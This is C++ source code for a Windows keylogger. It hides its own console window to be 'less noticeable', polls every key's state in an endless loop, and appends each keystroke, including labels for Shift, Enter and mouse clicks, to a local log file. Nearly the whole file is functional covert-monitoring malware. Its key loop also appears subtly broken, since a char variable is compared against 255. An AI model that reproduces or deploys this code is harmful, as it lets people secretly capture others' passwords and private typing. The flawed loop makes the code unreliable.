#include <iostream>
#include <windows.h>
#include <fstream>
#include <map>

// Keep in mind that if you are testing this that it constantly keeps adding to the same log file even if run many times

namespace keylogger {
  constexpr auto KEY_START = 8; // ASCII value of the first key to be logged
  constexpr auto KEY_END = 255; // ASCII value of the last key to be logged
  constexpr auto KEY_STATE_PRESSED = -32767; // Key state value indicating a key is pressed
  constexpr auto SLEEP_TIME = 10; // Time in milliseconds to sleep between key checks
  constexpr auto LOG_FILE = "log.txt";

  // Map of special keys and their string representations
  // These are essentially just number representations of keys,
  // but they are easier to read than the numbers themselves
  // If using this program on another operating system just replace
  // with the corresponding values for that operating system
  const std::map<int, std::string> SPECIAL_KEYS = {
    {VK_SHIFT, "[SHIFT]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_LBUTTON, "[LBUTTON]"},
    {VK_RBUTTON, "[RBUTTON]"},
    {VK_RETURN, "[ENTER]"},
    {VK_TAB, "[TAB]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CONTROL, "[Ctrl]"},
    {VK_MENU, "[Alt]"},
    {VK_CAPITAL, "[CAPS Lock]"},
    {VK_SPACE, "[SPACE]"}
  };
}

int Save(int _key, const char *file);

int main(){
    // Detach the console window. 
    // This hides the console window when the program is run from the command line,
    // making the keylogger less noticeable.
    // Note that this will not work if the program is run from an IDE.
    // And that it doesn't work on Linux, or macOS.
    FreeConsole();

    char key;
    while(true) {
        // Sleep for a short time to reduce CPU usage. Without this, the while loop would run as fast as possible,
        // taking up a lot of CPU resources.
        Sleep(keylogger::SLEEP_TIME);

        for(key = keylogger::KEY_START; key <= keylogger::KEY_END; key++) {
            // Check the state of each key. If the key is currently being pressed, save it to the log file.
            if(GetAsyncKeyState(key) == keylogger::KEY_STATE_PRESSED){
                Save(key, keylogger::LOG_FILE);
            }
        }
    }

    return 0;
}

int Save(int _key, const char *file) {
  std::ofstream output_file(file, std::ios::app); // Open the file in append mode

  if (!output_file) {
    std::cerr << "Failed to open file: " << file << std::endl; // Print an error message if the file cannot be opened
    return -1;
  }

  // Check if the key is a special key
  auto it = keylogger::SPECIAL_KEYS.find(_key);
  if (it != keylogger::SPECIAL_KEYS.end()) {
    // If it's a special key, log its string representation
    output_file << it->second;
  } else {
    // If it's not a special key, log it as a regular character
    output_file << static_cast<char>(_key);
  }

  output_file.close(); // Close the file
  return 0;
}
